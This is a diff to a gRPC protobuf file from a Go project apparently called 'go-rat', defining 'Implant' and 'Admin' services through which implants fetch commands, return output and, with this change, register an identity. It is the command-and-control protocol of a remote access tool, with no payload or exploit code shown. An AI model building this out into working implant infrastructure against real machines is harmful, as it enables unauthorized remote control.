@@ -3,17 +3,24 @@ package grpcapi;
 option go_package = "github.com/iortego42/go-rat/grpcapi";
 
 service Implant {
-  rpc FetchCommand (Empty) returns (Command);
+  rpc FetchCommand (Identity) returns (Command);
   rpc SendOutput (Command) returns (Empty);
+  rpc RegisterImplant (Identity) returns (Identity);
 }
 
 service Admin {
   rpc RunCommand (Command) returns (Command);
 }
 
+message Identity {
+  string Id = 1;
+  string Name = 2;
+}
+
 message Command {
   string In = 1;
   string Out = 2;
+  string Id = 3;
 }
 
 message Empty{
